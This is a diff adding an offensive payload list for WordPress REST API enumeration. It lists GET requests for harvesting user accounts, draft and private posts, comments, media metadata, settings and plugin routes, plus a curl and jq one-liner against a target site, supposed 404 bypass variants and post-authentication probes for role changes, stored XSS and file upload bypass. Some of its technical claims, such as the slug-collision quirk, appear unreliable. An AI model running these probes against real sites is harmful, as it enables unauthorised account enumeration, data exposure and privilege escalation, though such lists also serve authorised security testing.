@@ -1,0 +1,113 @@
+# WordPress REST API Enumeration Payloads
+
+The REST API leaks data by default on many installs. Test these directly.
+
+## Root / discovery
+```
+GET /wp-json/
+GET /wp-json/wp/v2/
+GET /index.php?rest_route=/wp/v2/
+GET /?rest_route=/wp/v2/
+```
+
+## Users (primary target)
+```
+GET /wp-json/wp/v2/users
+GET /wp-json/wp/v2/users?per_page=100
+GET /wp-json/wp/v2/users/1
+GET /wp-json/wp/v2/users/2
+GET /wp-json/wp/v2/users?slug=admin
+GET /wp-json/wp/v2/users?search=admin
+GET /wp-json/wp/v2/users?orderby=registered
+GET /wp-json/wp/v2/users?roles=administrator
+GET /wp-json/wp/v2/users/me     # returns 401 but leaks header info
+```
+
+## Posts / revisions (revisions leak draft content)
+```
+GET /wp-json/wp/v2/posts
+GET /wp-json/wp/v2/posts?status=draft
+GET /wp-json/wp/v2/posts?status=private
+GET /wp-json/wp/v2/posts/1
+GET /wp-json/wp/v2/posts/1/revisions
+GET /wp-json/wp/v2/posts?after=2026-01-01T00:00:00
+```
+
+## Comments (can reveal emails when set to public/private)
+```
+GET /wp-json/wp/v2/comments
+GET /wp-json/wp/v2/comments?per_page=100
+GET /wp-json/wp/v2/comments?status=approve
+```
+
+## Media (some uploads leak author + metadata / EXIF)
+```
+GET /wp-json/wp/v2/media
+GET /wp-json/wp/v2/media?per_page=100
+GET /wp-json/wp/v2/media?media_type=image
+```
+
+## Terms / taxonomies / categories
+```
+GET /wp-json/wp/v2/categories
+GET /wp-json/wp/v2/tags
+GET /wp-json/wp/v2/types
+GET /wp-json/wp/v2/statuses
+GET /wp-json/wp/v2/taxonomies
+```
+
+## Settings / options (should be admin-only, often misconfigured)
+```
+GET /wp-json/wp/v2/settings
+GET /wp-json/wp/v2/settings/general
+```
+
+## Non-standard / plugin routes worth probing
+```
+GET /wp-json/contact-form-7/
+GET /wp-json/woocommerce/
+GET /wp-json/elementor/v1/
+GET /wp-json/wpcf7/v1/
+GET /wp-json/rankmath/v1/
+GET /wp-json/yoast/v1/
+GET /wp-json/aioseo/v1/
+GET /wp-json/amazon-s3-and-cloudfront/v1/
+GET /wp-json/wc/v3/          # WooCommerce API
+GET /wp-json/wc/store/v1/products
+GET /wp-json/wp-inertia/v1/
+GET /wp-json/wordpress-seo/v1/
+```
+
+---
+
+## How to check results fast
+Use jq to pull only interesting fields:
+```bash
+curl -s "https://target.com/wp-json/wp/v2/users" | jq '.[] | {id: .id, slug: .slug, name: .name, link: .link}'
+```
+
+## Bypass approaches when /wp-json/ returns 404
+Due to a known WP quirk, this path returns 404 when slugs collide; try these:
+```
+GET /wp-json/wp/v2/users.json
+GET /wp-json/wp/v2/users?_jsonp=callback
+GET /wp-json/wp/v2/users?debug=true
+GET /index.php?rest_route=/wp/v2/users
+GET /index.php/wp-json/wp/v2/users
+GET /wp-json/wp/v2/users/1?rest_route=/wp/v2/users
+```
+
+## Post-auth escalation checks (if you get an account)
+```
+GET  /wp-json/wp/v2/users/me
+POST /wp-json/wp/v2/users/<id>   # try changing roles if you're author
+POST /wp-json/wp/v2/posts        # create post => stored XSS test bed
+POST /wp-json/wp/v2/media        # upload => file upload bypass test
+```
+
+---
+
+## Notes
+- The user endpoints are often disabled via a security plugin, but `?author=1` + xmlrpc `wp.getUsersBlogs` still work.
+- If REST shows 401 but leaks `X-WP-Nonce`-free endpoints, focus there.
+- Check the `Link:` response header of the homepage for `/wp-json/` even when the path 404s: `curl -sI https://target.com/ | grep -i link`
